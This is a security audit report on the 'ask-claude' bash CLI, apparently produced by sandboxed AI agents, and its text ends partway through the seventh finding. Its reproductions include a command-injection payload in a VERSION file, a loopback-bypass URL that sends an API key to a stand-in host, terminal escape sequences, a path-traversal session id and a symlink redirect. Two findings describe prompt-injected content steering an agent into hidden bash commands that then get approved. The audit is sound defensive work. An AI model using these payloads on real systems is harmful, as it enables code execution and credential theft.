# Security audit: ask-claude

## Run

- **Profile:** `standard`, with one recorded deviation. Phase 3 candidate validation and Phase 5 record verification were merged into one fresh independent verifier per candidate, as in the `quick` profile. You chose this to stay inside the 25-agent budget. Every confirmed record still got an independent re-check by an agent that did not hunt it.
- **Scope:** the whole repository at `wllttymw` (`08c7e28d`, v0.4.0) as seen in jj change `yryvkzmy`, which has git HEAD `52f92b71`. `.claude/skills/security-audit/` is out of scope: it is the audit tooling, added by `ysstqwps`. `wllttymw` was rewritten in another workspace during the run and is now commit `86a0b09a`. Compared with the audited tree, the only differences are 3 `.gitignore` lines (`rust/target/`) and a filled-in `LICENSE`. No audited code changed, so every record applies to `86a0b09a` as well.
- **Budget:** 25 agent invocations, 24 spent. The 24 were 4 reconnaissance agents, 6 hunters, 1 post-wave critic, 1 final-clean critic, and 11 verifiers. 1 was held in reserve and not needed.
- **Execution:** sandboxed, source review plus local runs only. Target code ran only in a throwaway container with no network, the target read-only, writes confined to the agent's scratch directory, and limits of 256 MiB, 0.5 CPU, 64 processes and 60 s. The container came from the repository's own devcontainer image, which ships jq 1.7 where the repository pins 1.8.2; records note where the difference matters. All secrets were dummies. No deployed endpoint or third-party service was contacted.
- **Prior runs:** none. This is the first ledger for this repository.
- **Coverage is partial, by budget.** The two coverage critics accepted 4 further units. All 4 are `deferred` (`budget_cannot_reserve_critics_and_validation`) and were **not** reviewed; they are listed in the coverage section. No clean-coverage claim is made.

## Posture

This is a single-user CLI. It never executes model or tool output locally, and its main defences hold: secrets are kept off curl's command line, the jq renderers sanitise output with `safe`, the state dir is created mode 700, and confirmations default to deny when there is no TTY.

The defects cluster at the edges of those controls:
- Values the shell pulls out with raw `jq -r` skip `safe`.
- An API-supplied id becomes a file path.
- Two gates, `--base-url` and the state dir, check strings and permission bits, not what they actually protect.
- Grant and temp files are created by fixed name, with no ownership or exclusivity check.

The one medium finding is in release tooling, not the CLI: `check-effver` evaluates commit-controlled `VERSION` text in bash arithmetic. Every CLI finding needs a hostile API endpoint, a second local account, a planted symlink, or PID reuse. All CLI findings are rated low.

## Confirmed findings

| Severity | Title | Sink | Observed result |
|---|---|---|---|
| medium | check-effver runs commands from a commit's VERSION through bash arithmetic on an unvalidated parent version | `tools/effver/check-effver:57` | Unmodified checker created a marker file from a parent commit's VERSION; valid-parent control exited 0. |
| low | --base-url loopback gate accepts http://localhost:@remote-host, sending x-api-key in cleartext to a non-loopback host | `ask-claude.sh:251` | `http://localhost:@evil.invalid` passed the gate; a stub received `Host: evil.invalid` and the plaintext `x-api-key`. |
| low | -f file contents and interactive chat lines are passed on jq's command line, contrary to the script's secrets-off-argv design | `ask-claude.sh:335` | `-f` file contents and chat lines appeared in jq argv; key and tokens appeared 0 times. |
| low | Managed Agents tool names, stop reasons, event ids, session ids and raw stream bytes reach the terminal without the `safe` filter | `ask-claude.sh:443` | Raw ESC/OSC bytes on stderr at 7 sinks; `safe`-filtered siblings stripped the same bytes in the same run. |
| low | Tool-confirmation prompt double-escapes tool input, misrepresenting the approved command | `ask-claude.sh:443` | Two-command input was shown as the exact encoding of a different one-command input; allow was sent. |
| low | Stale per-PID 'always' tool-confirmation grant file auto-approves agent tool calls in a later process | `ask-claude.sh:487` | New process with the same PID and no answer sent `result=allow`; fresh-state control sent deny. |
| low | agent files download writes through a pre-existing <name>.part symlink, bypassing no-clobber | `ask-claude.sh:698` | Planted `report.txt.part` symlink redirected the downloaded bytes into another file (replay and live curl). |
| low | API-supplied Managed Agents session id is used as a file name, letting the endpoint overwrite any user-writable file | `ask-claude.sh:584` | Session id `../../../../victim.txt` overwrote a user file four levels above the state dir. |

### 1. check-effver runs commands from a commit's VERSION through bash arithmetic on an unvalidated parent version

`tools/effver/check-effver:bump:parent-VERSION-arithmetic-injection`. Severity **medium**: likelihood low, impact high. Confidence: high.

**Source:** `tools/effver/check-effver:45`, `tools/effver/check-effver:72`, `tools/effver/check-effver:75`, `tools/effver/check-effver:103`, `tools/effver/check-effver:54`, `tools/effver/check-effver:57`

**Lower-trust principal:** A contributor who can author commits in a range that the maintainer checks with check-effver, with no need for the maintainer to run any code from that branch.

**What goes wrong:** check-effver reads VERSION and CHANGELOG.md from commit trees in a git range or jj revset without checking them out. It matches only the VERSION of the commit under check against version_re (line 85). The VERSION of each parent commit (line 72) becomes $old (line 75) with no validation and reaches bump() at line 103. bump() splits $old on dots (line 54) and evaluates the parts in $((...)) (lines 56-60). Bash arithmetic evaluates a variable's value recursively as an expression, and it expands an array subscript in that value, including $(...). So a parent VERSION such as 0.4.x[$(cmd)] runs cmd. The malformed parent VERSION is reported as a problem when that commit is checked, but the loop continues. The payload runs when the next commit, which has a valid VERSION, a valid first CHANGELOG heading and a different version, is checked. An author who supplies both commits in a range that a developer checks gets command execution as that developer. The developer only has to run the checker, not any code from the branch.

**Bounded reproduction:**

1. In the sandbox, create a git fixture repo with three commits on main: base (VERSION 0.4.0, heading `## 0.4.0 (macro) - 2026-11-05`), parent (VERSION set to the payload), and child (VERSION 0.4.1 with the valid micro heading).
2. Confirm /scratch/MARKER_v11 does not exist.
3. Run the unmodified target checker read-only from the fixture repo: bash /target/tools/effver/check-effver main~2..main
4. Check whether /scratch/MARKER_v11 exists. As a control, repeat with the parent VERSION 0.4.0 and expect exit 0.

**Conditions:**

- *user_interaction*: A developer runs check-effver, with a git range or through `just check-effver` with a jj revset, over a range that contains the attacker's commits.
- *data_state*: The crafted VERSION commit is a parent of a later commit in the range. That later commit has a valid VERSION, a valid first CHANGELOG heading with a non-empty section, and a VERSION different from the parent. The attacker can author both commits. With more than one parent, the crafted string must sort highest under sort -V.
- *environmental_dependency*: Under set -u, the subscript base must be a set variable (x, y or z inside bump, or BASH_VERSINFO); an unset name aborts before the subscript expands. Reproduced on bash 5.2.21; bash 5.3 on the host was not exercised.

**Observed result:** check-effver printed `VERSION is "0.4.x[$(touch /scratch/MARKER_v11)]", not MACRO.MESO.MICRO` for the parent commit and exited 1, and /scratch/MARKER_v11, absent before the run, had been created. The control with a valid parent exited 0. A patched copy that rejects a malformed parent and makes bump() validate its argument exited 1 and did not create its marker.

**Impact:** Arbitrary command execution as the developer on the developer machine, which holds .env with ANTHROPIC_API_KEY and VCS credentials. The tool is designed to read commit content without running it.

**Priority rationale:** The developer has to run check-effver over a range that contains a hostile commit pair. Nothing in the repository runs it automatically, and the default jj revset covers only the local stack not yet on trunk, so a foreign commit must first be fetched or rebased into it. The checker prints the malformed VERSION only after the payload has run.

**Smallest source fix:** Validate every VERSION string before arithmetic. In the parent loop, report a parent VERSION that does not match version_re and do not fold it into $old. Make bump() reject an argument that does not match version_re, and treat that failure as a problem at line 103. Use 10#$n in the arithmetic only after validation, so leading zeros are not read as octal. This enforces the invariant at the sink (bump) as well as at the source, so no caller can move trust around it.

`tools/effver/check-effver`:

```bash
bump() {
  # Only a validated MACRO.MESO.MICRO string may reach arithmetic.
  [[ $1 =~ $version_re ]] || return 1
  local x y z
  IFS=. read -r x y z <<<"$1"
  case "$x:$2" in
    0:macro) echo "0.$((10#$y + 1)).0" ;;
    0:*) echo "0.$y.$((10#$z + 1))" ;;
    *:macro) echo "$((10#$x + 1)).0.0" ;;
    *:meso) echo "$x.$((10#$y + 1)).0" ;;
    *:micro) echo "$x.$y.$((10#$z + 1))" ;;
  esac
}

  # parent loop (replaces lines 71-77):
  for p in $(parents "$id"); do
    if pv="$(show "$p" VERSION)"; then
      had=1
      if ! [[ $pv =~ $version_re ]]; then
        problems+=("parent ${p:0:12} VERSION is not MACRO.MESO.MICRO")
        continue
      fi
      [ "$pv" = "$(show "$id" VERSION 2>/dev/null || true)" ] && same=1
      old="$(printf '%s\n%s\n' "$old" "$pv" | sed '/^$/d' | sort -V | tail -n 1)"
    fi
  done

  # bump check (replaces line 103):
      want="$(bump "$old" "$effort")" || want=""

# Regression fixture: base 0.4.0 -> parent VERSION 0.4.x[$(touch MARKER)] -> child 0.4.1 (micro);
# check-effver must exit 1 and MARKER must not exist.
```

### 2. --base-url loopback gate accepts http://localhost:@remote-host, sending x-api-key in cleartext to a non-loopback host

`ask-claude.sh:base-url-gate:loopback-userinfo-bypass`. Severity **low**: likelihood low, impact medium. Confidence: high.

**Source:** `ask-claude.sh:91`, `ask-claude.sh:94`, `ask-claude.sh:97`, `ask-claude.sh:349`, `ask-claude.sh:251`

**Lower-trust principal:** An on-path network observer, or the operator of the host named after '@', who benefits when a user runs ask-claude with a loopback-looking base URL that the gate approves.

**What goes wrong:** The --base-url gate (ask-claude.sh:88-96) states that anything but https goes to a loopback address only, so the key never travels in clear over a network. It matches the raw string with shell case globs that accept any text after 'http://localhost:', 'http://127.0.0.1:' or 'http://[::1]:'. curl parses the text before an '@' in the authority as userinfo, so http://localhost:@evil.host passes the gate and curl connects to evil.host over plain HTTP. Every request that uses BASE_URL (messages at 251, Managed Agents calls at 381/384, the session stream at 401, file upload at 668, file download at 698) then carries ANTHROPIC_API_KEY in the x-api-key header, plus request bodies that can carry the MCP token and GITHUB_TOKEN, to that remote host and to any passive observer on the path.

**Bounded reproduction:**

1. In an offline sandbox, run: env -i PATH=/usr/bin:/bin HOME=<empty dir> XDG_STATE_HOME=<scratch dir> ANTHROPIC_API_KEY=sk-ant-test-not-a-key usage_model=m usage_max_tokens=16000 usage_prompt=ping usage_base_url='<payload>' bash ask-claude.sh </dev/null
2. Controls: usage_base_url=http://evil.invalid, http://localhost.evil.invalid and http://127.0.0.1.evil.invalid must exit 2 with the gate message.
3. To observe the request bytes, write 'connect-to = evil.invalid:80:127.0.0.1:8099' to HOME/.curlrc (reroutes only the TCP connect; the URL and Host stay evil.invalid) and run a loopback listener on 127.0.0.1:8099 that records the request head.

**Conditions:**

- *user_interaction*: The user, or a .env, alias, wrapper or copied instruction the user runs, supplies --base-url of the form http://<loopback-literal>:<anything>@<remote-host>. The value is user-supplied; the gate exists to stop exactly this cleartext case.
- *network_routing*: The key reaches the named remote host and any passive observer on the network path, because the transport is plain HTTP.

**Observed result:** All three controls exited 2 with the gate message. All four payloads passed the gate; curl exited with 'Could not resolve host: evil.invalid' and the script exited 1. With the connect-to reroute, the loopback listener received plaintext 'POST /v1/messages HTTP/1.1', 'Host: evil.invalid', 'Authorization: Basic bG9jYWxob3N0Og==' (userinfo 'localhost:') and 'x-api-key: sk-ant-test-not-a-key' for http://localhost:@evil.invalid, and the same with 'Authorization: Basic Wzo6MV06eA==' for http://[::1]:x@evil.invalid.

**Impact:** Disclosure of ANTHROPIC_API_KEY (and request bodies that can carry the MCP token and GITHUB_TOKEN) in cleartext to a remote host and to the network path, which is the property the gate claims to guarantee. Demonstrated locally with a dummy key.

**Priority rationale:** The value comes from the invoking user. Exploitation needs the user to adopt a crafted loopback-looking URL with an embedded '@'. A user can already send the key to any https host by design, so the marginal risk is the cleartext transport and the false assurance of the documented gate.

**Smallest source fix:** Decide on the parsed authority, not a string prefix. Refuse any base URL that contains '@' (this also refuses '@' in a path, which the API root never needs). Accept http only when the whole URL matches http://(localhost|127.0.0.1|[::1]) with an optional all-digit port and an optional '/'-path. Add regression cases for http://localhost:@x, http://127.0.0.1:1@x, http://[::1]:x@x and http://localhost:8080@x/. The fix enforces the stated invariant at the only point BASE_URL is validated; it does not move trust elsewhere.

`ask-claude.sh`:

```bash
BASE_URL="${usage_base_url:-https://api.anthropic.com}"
case "$BASE_URL" in
*://*@*) die "--base-url must not carry user info, got: $BASE_URL" ;;
esac
if [[ $BASE_URL == https://* ]]; then :
elif [[ $BASE_URL =~ ^http://(localhost|127\.0\.0\.1|\[::1\])(:[0-9]+)?(/.*)?$ ]]; then :
else die "--base-url must be https:// (or http:// on localhost), got: $BASE_URL"; fi
API="${BASE_URL%/}/v1/messages"
```

### 3. -f file contents and interactive chat lines are passed on jq's command line, contrary to the script's secrets-off-argv design

`ask-claude.sh:jq-arg-private-text-on-argv`. Severity **low**: likelihood low, impact medium. Confidence: high.

**Source:** `ask-claude.sh:853`, `ask-claude.sh:857`, `ask-claude.sh:335`

**Lower-trust principal:** Another unprivileged local account on the same host that reads other processes' argv.

**What goes wrong:** The transport keeps the API key and the request body off curl's command line because 'other local accounts can read' it (ask-claude.sh:240-241). The private text that becomes the body is still placed on jq's argv when the request is built: the full contents of the one-shot -f file (ask-claude.sh:853 -> 857 -> 335), every line typed in the chat loop (208 -> 224 -> 335), the first agent chat line (648 -> 569) and every later agent chat line (651). None of this text was on the user's own command line. On hosts where other accounts can read process arguments (Linux /proc/<pid>/cmdline without hidepid), another local account that polls the process table can capture it while each short-lived jq process runs. Credentials are not affected: the key reaches curl through a /dev/fd pipe and the MCP and GitHub tokens are read inside jq through env.

**Bounded reproduction:**

1. In the parent-approved sandbox, put argv-recording shims for jq and curl first on PATH; each appends its argv to a scratch log and execs the real binary.
2. Run the one-shot with -f and the chat loop under ASK_CLAUDE_REPLAY=<message SSE fixture>, the agent chat loop under ASK_CLAUDE_REPLAY=<directory>, and one live one-shot with usage_base_url=http://127.0.0.1:9 (nothing listens), all with dummy secrets ANTHROPIC_API_KEY=sk-ant-APIKEY-CANARY-v02, ASK_CLAUDE_MCP_TOKEN=MCPTOKEN-CANARY-v02, GITHUB_TOKEN=ghp_GHTOKEN-CANARY-v02.
3. Count each canary in the jq and curl argv logs.

**Conditions:**

- *system_configuration*: A multi-user host where another account can read other users' process arguments, such as Linux /proc/<pid>/cmdline with the default hidepid=0. Not observed cross-account in this audit (the sandbox is single-user); macOS behaviour is unverified.
- *timing_dependency*: The observer must sample the process table while a short-lived jq process runs, once per turn; a tight polling loop makes this practical.
- *user_interaction*: The victim uses -f with private content, or types private text in the chat loop or the agent chat loop.

**Observed result:** jq argv contained FILE-CONTENT-CANARY-v02a 2 times (replay one-shot and live one-shot, as 'jq [--arg] [c] [FILE-CONTENT-CANARY-v02a ...'), CHAT-LINE-CANARY-v02b 1 time, AGENT-FIRST-CANARY-v02c 1 time (as '--arg prompt' with -f /target/lib/session-create.jq) and AGENT-NEXT-CANARY-v02d 1 time (as '--arg t'). The API key, MCP token and GitHub token canaries appeared 0 times in jq argv and 0 times in curl argv. Live curl argv was '-sS -N --max-time 1800 http://127.0.0.1:9/v1/messages -H @/dev/fd/63 --data-binary @-'. Cross-account readability of argv was not exercised.

**Impact:** Disclosure of -f file contents and conversation text that the script explicitly treats as private (umask 077, mode-700 state dir, secrets-off-argv design). Credentials are not exposed.

**Priority rationale:** Requires a second local account on a host that exposes other users' argv, sampling during a millisecond-scale jq run per turn. Single-user laptops and containers are not affected.

**Smallest source fix:** Pass user request text to jq through stdin or the environment, as the script already does for tokens; keep only filenames and non-private fixed values on argv. Add a regression test that runs the one-shot -f path, the chat loop and the agent loop with an argv-recording jq shim and asserts that no prompt or file canary appears in any child argv.

`ask-claude.sh`:

```bash
ask() {
  printf '%s' "$1" | jq -R -s --slurpfile h "$HIST" '$h[0] + [{"role":"user","content":.}]' >"$HIST.tmp" && mv "$HIST.tmp" "$HIST"
  call
}
# session_create (line 569): replace --arg prompt "$1" with ASK_CLAUDE_PROMPT="$1" in jq's environment and read env.ASK_CLAUDE_PROMPT in lib/session-create.jq.
# session_loop (line 651): printf '%s' "$line" | jq -R -s -c '{events: [{type: "user.message", content: [{type: "text", text: .}]}]}'
```

### 4. Managed Agents tool names, stop reasons, event ids, session ids and raw stream bytes reach the terminal without the `safe` filter

`ask-claude.sh:managed-agents-status-sinks-bypass-safe`. Severity **low**: likelihood low, impact low. Confidence: high.

**Source:** `ask-claude.sh:401`, `lib/session-fold.jq:19`, `ask-claude.sh:466`, `ask-claude.sh:518`, `ask-claude.sh:571`, `ask-claude.sh:443`

**Lower-trust principal:** A malicious or compromised Managed Agents endpoint returns session events and a POST /sessions response whose server-assigned string fields contain terminal control sequences.

**What goes wrong:** The script states that API text must not drive the terminal (ask-claude.sh:122-125) and applies `safe` in every lib/*.jq render program and in most shell-side jq calls. Several Managed Agents values that the shell extracts itself bypass that filter: the tool name and string-typed tool input in the confirmation prompt (443, to /dev/tty) and its status lines (439, 463, 464), stop_reason (518 -> 551), stop_reason.event_ids (521), the session id returned by POST /sessions (571 -> 550, 655; it is also persisted as a sessions/ file name by session_remember at 584 and later echoed by `agent archive`/`trace`/`resume` at 732/809/820), and the first 200 raw bytes of a non-SSE stream body (503). An API endpoint that puts ESC/BEL/OSC/CSI sequences in these fields writes them to the user's terminal: window-title changes, line/screen erasure (including rewriting the displayed 'allow NAME INPUT? [y/N/a]' confirmation text), and OSC 52 clipboard writes on terminals that honour OSC 52.

**Bounded reproduction:**

1. In the parent sandbox (no network, read-only target at /target, dummy key sk-ant-test-not-a-key, XDG_STATE_HOME=/scratch/state), run `bash /target/ask-claude.sh` with usage_cmd=agent usage_prompt=hi usage_agent=agent_x usage_environment=env_x usage_budget=0 usage_model=m usage_max_tokens=16000 and ASK_CLAUDE_REPLAY pointing at a directory with the turn 1/turn 2 fixtures as 1.sse/2.sse; once with ASK_CLAUDE_CONFIRM=allow and once unset with stdin </dev/null.
2. Repeat with a directory whose 1.sse holds the event_ids payload, and with one whose 1.sse holds the non-SSE body.
3. For the session id: source `head -n 772 /target/ask-claude.sh`, set LIB=/target/lib, override ma_call so 'POST /sessions' returns the payload id, use a 1.sse with stop_reason budget_reached, and feed one line to session_loop.
4. Pipe all output through `cat -v` so raw 0x1b shows as ^[ and BEL as ^G (script: agents/v03/artifacts/run.sh).

**Conditions:**

- *third_party_dependency*: The attacker controls Managed Agents API responses: the https host the user named with --base-url, or the API provider itself (or a compromise of either). Built-in tool names, stop_reason, event_ids and session ids are server-assigned, and object tool inputs are JSON-escaped by tostring, so model output alone is not shown to reach these fields.
- *user_interaction*: The user runs `ask-claude agent ...` (one-shot, chat loop, or resume) against that endpoint.
- *environmental_dependency*: The concrete terminal effect (title set, line erase, prompt rewrite, OSC 52 clipboard write) depends on the user's terminal emulator. The raw bytes reach stderr / /dev/tty unconditionally.

**Observed result:** stderr carried raw control bytes: 'ask-claude: allowed bash^[[2K^[[1Gread_file (^[]0;V03-TITLE^Gls)', 'ask-claude: denied bash^[[2K^[[1Gread_file (^[]0;V03-TITLE^Gls): stdin is not a terminal ...', '[stopped: ^[]52;c;cHduZWQ=^Gend_turn]', '(evt_^[]0;V03-T3^G); interrupting', 'no response from the stream (==> ... <==oops ^[]0;V03-T2^G ^[[2J)', '[stopped: budget_reached, raise it with: ask-claude agent budget sesn_^[]0;V03-T5^G <cents>]', 'resume with: ask-claude agent resume sesn_^[]0;V03-T5^G'. In the same runs the safe-filtered paths (lib/session.jq live render, usage line 537) printed the same values with ESC/BEL removed. A sessions/ file named 'sesn_^[]0;V03-T5^G' was created. Line 443 (/dev/tty) was not exercised (no TTY); it interpolates the identical $1/$2 values.

**Impact:** Demonstrated: arbitrary escape sequences on the user's stderr (title set, line/screen erase, OSC 52 clipboard payload) and, from source, in the /dev/tty confirmation prompt, so a hostile endpoint can make the displayed prompt text differ from the tool name. A hostile endpoint already runs the agent's tools server-side, so prompt spoofing grants no extra tool authority; local code execution would need a further user paste and was not shown.

**Priority rationale:** Requires the Managed Agents endpoint itself to be hostile or compromised: the provider, or an https host the user chose with --base-url. Model output and web/MCP content are not shown to reach these server-assigned or JSON-escaped fields.

**Smallest source fix:** Sanitise at extraction time: apply SAFE to every display-only field the shell pulls out with jq, keep exact values only where they are sent back to the API, and validate identifiers that are also used in file names and URL paths (session id) against their expected shape at the point they enter (571). Strip C0 and C1 control bytes from raw diagnostic dumps. This enforces the existing invariant at the boundary rather than moving trust; the lib/*.jq renderers already hold.

`ask-claude.sh`:

```bash
# 466: display copies sanitised; id kept exact for the answer event
done < <(jq -r "$SAFE"'.asks[] | [.id, (.name // "?" | tostring | safe), (.input | tostring | safe)] | @tsv' <<<"$fold")
# 518
stop=$(jq -r "$SAFE"'.stop_reason // "" | tostring | safe' <<<"$fold")
# 521
... ($(jq -r "$SAFE"'.event_ids | map(tostring) | join(" ") | safe' <<<"$fold")) ...
# 503: strip C0, DEL and C1 bytes from the raw dump
... ($(head -c 200 "$log.err" "$log" 2>/dev/null | LC_ALL=C tr -d '\000-\037\177-\237' | cut -c1-200)) ...
# 571-572: session_create
sesn=$(jq -r '.id // empty' <<<"$resp" 2>/dev/null)
[[ $sesn =~ ^sesn_[A-Za-z0-9_]+$ ]] || sesn=""
```

### 5. Tool-confirmation prompt double-escapes tool input, misrepresenting the approved command

`ask-claude.sh:session_answer:tsv-double-escape-confirm-display`. Severity **low**: likelihood low, impact low. Confidence: high.

**Source:** `lib/session-fold.jq:21`, `ask-claude.sh:466`, `ask-claude.sh:460`, `ask-claude.sh:443`

**Lower-trust principal:** Content the agent reads (web page, file, tool output) prompt-injects the model into proposing a bash tool call whose command hides a second command behind a real newline, so the prompt depicts one harmless-looking command.

**What goes wrong:** session_answer renders each pending agent.tool_use input as (.input | tostring) and then passes the row through @tsv, which escapes every backslash a second time; read -r keeps the doubled backslash and session_confirm prints it verbatim. A real newline inside input.command (two shell commands, 'echo safe' NL 'id') is shown as {"command":"echo safe\\nid"}, which is byte-identical to the correct single-encoded JSON of a different input: one echo command containing a literal backslash-n. The user's y answer is bound to the tool_use_id, so it approves the server-held two-command input, not the one the prompt depicts. Model output steerable by injected web/tool content can choose such input.

**Bounded reproduction:**

1. In the network-less sandbox (sandbox-run.sh, jq 1.7, bash 5.2), write the two SSE fixtures under /scratch/fx/{nl,lit}/1.sse.
2. Run: XDG_STATE_HOME=/scratch/st usage_cmd=agent usage_prompt=ping usage_model=m usage_max_tokens=16000 usage_agent=agent_X usage_environment=env_X usage_budget=0 ANTHROPIC_API_KEY=sk-ant-test-not-a-key ASK_CLAUDE_REPLAY=/scratch/fx/nl ASK_CLAUDE_REQUEST_LOG=/scratch/req.jsonl bash -c "printf 'y\n' | script -qec 'bash /target/ask-claude.sh' /scratch/ts.txt"
3. Compare the 'allow bash' line in the typescript with od -c of the fixture's input.command, and read the user.tool_confirmation in the request log. Repeat with the lit fixture as a control.

**Conditions:**

- *user_interaction*: The user runs the agent subcommand interactively on a TTY without ASK_CLAUDE_CONFIRM and answers y or a at the prompt, relying on the displayed input.
- *third_party_dependency*: The agent model (steerable by prompt-injected content it reads) emits an agent.tool_use for an always_ask tool whose string input contains a newline, e.g. a bash command with a second command after a newline.

**Observed result:** Real-newline input (bytes 'echo safe' NL 'id') is prompted as: allow bash {"command":"echo safe\\nid"}? and allow is sent for sevt_V1. The control input with a literal backslash-n is prompted as {"command":"echo safe\\\\nid"}. The prompt for the two-command input is therefore byte-identical to what a correct single encoding would show for the one-command literal-backslash-n input. Replacing the @tsv row with per-ask jq -c .input renders {"command":"echo safe\nid"} and {"command":"echo safe\\nid"} respectively (correct single encoding).

**Impact:** The user approves a command whose structure (two commands vs one) differs from what the prompt depicts; execution happens in the remote session container under the user's API authority, not on the local machine. Demonstrated only up to the allow being sent for the real tool_use_id.

**Priority rationale:** Requires an injected model to propose a multi-line input for an always_ask tool, an interactive user who reads the shown value as JSON, and the trailing command text remains visible in the prompt, so a careful reader can still notice it.

**Smallest source fix:** Encode the input exactly once and do not pass JSON text through @tsv. Iterate the asks as compact JSON lines (jq -c '.asks[]', one line per ask because JSON escapes newlines) and extract id, name and input per ask, with input rendered by jq -c (tojson). This keeps C0 bytes \u-escaped and newlines visible as a single \n escape. Apply the same rendering to the allowed/denied log lines (ask-claude.sh:463-464). Optional hardening (separate issue): sanitise .name for the prompt with the same safe filter used in lib/session.jq. Regression test: a fixture whose input.command contains a real newline must render exactly {"command":"echo safe\nid"}, and a literal backslash-n must render {"command":"echo safe\\nid"}. The hunter's base64 variant also works, but adds a base64 -d dependency whose flag differs on older macOS (-D).

`ask-claude.sh`:

```bash
  while IFS= read -r ask; do
    id=$(jq -r '.id // empty' <<<"$ask")
    [ -n "$id" ] || continue
    name=$(jq -r '.name | tostring' <<<"$ask")
    input=$(jq -c '.input' <<<"$ask")
    result=$(session_confirm "$name" "$input")
    [ "$result" = allow ] && echo "ask-claude: allowed $name ($input)" >&2
    [ "$result" = deny ] && [ -n "${ASK_CLAUDE_CONFIRM:-}" ] && echo "ask-claude: denied $name ($input): ASK_CLAUDE_CONFIRM=$ASK_CLAUDE_CONFIRM" >&2
    answers=$(jq -c --arg id "$id" --arg r "$result" '. + [{type: "user.tool_confirmation", tool_use_id: $id, result: $r}]' <<<"$answers")
  done < <(jq -c '.asks[]' <<<"$fold")
```

### 6. Stale per-PID 'always' tool-confirmation grant file auto-approves agent tool calls in a later process

`ask-claude.sh:session_confirm:always-grant-file-pid-reuse`. Severity **low**: likelihood low, impact medium. Confidence: high.

**Source:** `ask-claude.sh:443`, `ask-claude.sh:447`, `ask-claude.sh:462`, `ask-claude.sh:434`, `ask-claude.sh:487`

**Lower-trust principal:** Model output proposes a tool call that the user never approved. Prompt-injected web, repo or file content can steer that output. The stale grant from an unrelated earlier process approves the call.

**What goes wrong:** Answering 'a' at the Managed Agents tool-confirmation prompt creates $STATE/.always.<pid> (ask-claude.sh:447). Nothing ever deletes it. session_confirm treats the existence of $STATE/.always.$$ as a standing allow (ask-claude.sh:434), and this check runs before the no-terminal deny (ask-claude.sh:438). A later `ask-claude agent` or `agent resume` process that receives the same PID therefore sends result=allow for every agent.tool_use confirmation without prompting, including unattended runs whose default is deny. PID reuse happens through PID wraparound on a host, where the risk grows as grant files accumulate, and deterministically in containers or devcontainers that launch the same way and share the state dir. The approved tool calls are chosen by the model, which prompt-injected web, repo or file content can steer. They run in the remote session container with the session's resources (mounted GitHub repo, vaults, memory stores), and the user never approved them.

**Bounded reproduction:**

1. Run each step in a network-less sandbox with XDG_STATE_HOME=<state dir>, ASK_CLAUDE_REPLAY=/scratch/fx/grant, a dummy ANTHROPIC_API_KEY, usage_cmd=agent, usage_prompt=ping, usage_agent=agent_X, usage_environment=env_X, usage_budget=0 and ASK_CLAUDE_REQUEST_LOG set. ASK_CLAUDE_CONFIRM is unset.
2. Process A, in container 1 with a fresh state dir: run `printf 'a\n' | script -qec 'bash /target/ask-claude.sh' /dev/null`. Expected: the prompt appears, the answer is 'a', and .always.<pid> remains in the state dir after exit.
3. Process B, in a new container with the same state dir and the same launch command but empty stdin, so no answer is typed: inspect the second line of the request log.
4. Control: repeat process B with a fresh state dir. Expected: the prompt appears and result=deny is sent.
5. Unattended ordering: with no pty, stdin /dev/null and a .always.<pid> matching the PID the script gets (via `bash -c ': >"$STATE/.always.$$"; exec bash /target/ask-claude.sh'`), inspect the confirmation sent.

**Conditions:**

- *user_interaction*: In some earlier ask-claude agent process, the user answered 'a' at a tool confirmation, which left $STATE/.always.<pid>.
- *timing_dependency*: A later ask-claude agent process gets the same PID. On a host this happens through PID wraparound, and the probability grows with the number of leftover files. In a container or devcontainer that shares the state dir and launches the same way, it is deterministic: v05 saw the same PID across separate containers.
- *system_configuration*: The agent's tools use an always_ask permission policy, so agent.tool_use confirmations reach the client. ASK_CLAUDE_CONFIRM is unset or 'ask'.

**Observed result:** Process A (PID 15) left .always.15 after exit. Process B, a new process in a new container with the same PID 15 and nothing typed, printed no prompt. It logged 'ask-claude: allowed bash ({"command":"echo pong"})' and sent {"events":[{"type":"user.tool_confirmation","tool_use_id":"sevt_T1","result":"allow"}]}. The fresh-state-dir control printed the prompt and sent result=deny. Runs whose PID differed from 15 sent deny. With no terminal and a matching stale grant (PID 13), the script sent result=allow instead of the default no-TTY deny.

**Impact:** Model-chosen tool calls (bash, file writes, fetches) that the user never approved run in the remote session container, with the session's mounted repo credentials, vaults and memory stores. The no-terminal default deny is overridden. Nothing runs on the local machine.

**Priority rationale:** The user must first have answered 'always' in some process, and a later agent process must then get the same PID. On a host that is a probabilistic wraparound collision, and leftover files accumulate. It is deterministic only in containers that launch the same way and share a persistent state dir. The agent must also use always_ask tool policies.

**Smallest source fix:** Bind the grant to the live process. In session_prereqs, which runs before every `agent` and `agent resume` request, compute ALWAYS="$STATE/.always.$$", remove any stale file at that path, and install an EXIT trap that removes it. session_confirm then checks and creates "$ALWAYS". The startup rm enforces the invariant even when the earlier process was SIGKILLed and its EXIT trap never ran. The EXIT trap only keeps files from accumulating. session_cleanup resets only the INT trap, so it does not clobber the EXIT trap. A file is still needed because session_confirm runs in a command-substitution subshell and cannot set parent variables. Regression test: create $STATE/.always.<pid> for the PID the script will get (exec chain), run the confirm fixture off a terminal, and assert result=deny.

`ask-claude.sh`:

```bash
# end of session_prereqs, before need_key returns:
ALWAYS="$STATE/.always.$$"
rm -f "$ALWAYS"
trap 'rm -f "$ALWAYS"' EXIT

# session_confirm:
  if [ -e "$ALWAYS" ]; then
    echo allow
    return
  fi
  ...
  a | A | always)
    : >"$ALWAYS"
    echo allow
    ;;
```

### 7. agent files download writes through a pre-existing <name>.part symlink, bypassing no-clobber

`ask-claude.sh:session_files/part-file-symlink-follow`. Severity **low**: likelihood low, impact medium. Confidence: high.

**Source:** `ask-claude.sh:683`, `ask-claude.sh:690`, `ask-claude.sh:693`, `ask-claude.sh:697`, `ask-claude.sh:698`

**Lower-trust principal:** A party that controls entries in the user's working directory, but not the user's account, plants <name>.part as a symlink to a file it wants overwritten. The bytes come from the session file that the agent produced and the API served.

**What goes wrong:** session_files (ask-claude.sh:680-707) refuses to download when $name already exists (693), but it writes the bytes to $name.part, through a shell redirect in replay mode (697) or curl -o in live mode (698). Neither write is exclusive and both follow an existing symlink. mv (703) then renames the symlink itself onto $name. A party that can place <name>.part as a symlink in the directory where the user runs `ask-claude agent files <sesn> <name>` therefore redirects the session file's bytes into any path the user can write. If the symlink dangles, the write creates a new file at that path. Examples of such a party: a cloned repository that commits the symlink, or another account in a shared directory. Linux fs.protected_symlinks covers only sticky world-writable directories, and macOS has no equivalent. The bytes are the session file's content, which the agent produces and which the API endpoint serves, so the prompt, web content or a hostile endpoint can choose them. Both write branches were reproduced locally.
